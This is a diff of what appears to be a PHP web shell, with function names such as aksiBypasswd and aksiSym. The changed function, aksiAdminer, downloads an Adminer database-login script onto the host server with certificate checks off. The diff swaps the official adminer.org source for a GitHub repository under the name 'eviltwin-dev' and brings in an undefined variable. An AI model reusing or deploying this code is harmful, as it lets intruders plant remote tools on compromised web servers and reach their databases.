@@ -1063,31 +1063,30 @@ function aksiBypasswd($dir,$file){
 	exit;
 }
 function aksiAdminer($dir,$file){
-	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
-	function adminer($url, $isi){
+	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $path);
+	function adminer($url, $isi) {
 		$fp = fopen($isi, "w");
 		$ch = curl_init();
-		curl_setopt($ch, CURLOPT_URL, $url);
-		curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
-		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-		curl_setopt($ch, CURLOPT_FILE, $fp);
+		 	  curl_setopt($ch, CURLOPT_URL, $url);
+		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
+		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
 		return curl_exec($ch);
-		curl_close($ch);
+		   	  curl_close($ch);
 		fclose($fp);
 		ob_flush();
 		flush();
 	}
-	if(file_exists('adminer.php')){
-		echo "<a href='$full/adminer.php' target='_blank' class='text-center btn btn-success btn-block mb-3'>Login Adminer</a>";
-	}else{
-		if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")){
-			echo "<p class='text-center'>Berhasil Membuat Adminer</p><a href='$full/adminer.php' target='_blank' class='text-center btn btn-success btn-block mb-3'>Login Adminer</a>";
-		}else{
-			echo "<p class='text-center text-danger'>Gagal Membuat Adminer</p>";
+	if(file_exists('adminer.php')) {
+		echo "<center><font><a href='$full/adminer.php' target='_blank'>> ADMINER LOGIN <</a></font></center>";
+	} else {
+		if(adminer("https://raw.githubusercontent.com/eviltwin-dev/adm/master/adminer.php","adminer.php")) {
+			echo "<center><font><a href='$full/adminer.php' target='_blank'>> ADMINER LOGIN <</a></font></center>";
+		} else {
+			echo "<center><font>Failed to create file adminer.</font></center>";
 		}
 	}
-	exit;
 }
 function aksiSym($dir,$file){
 	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
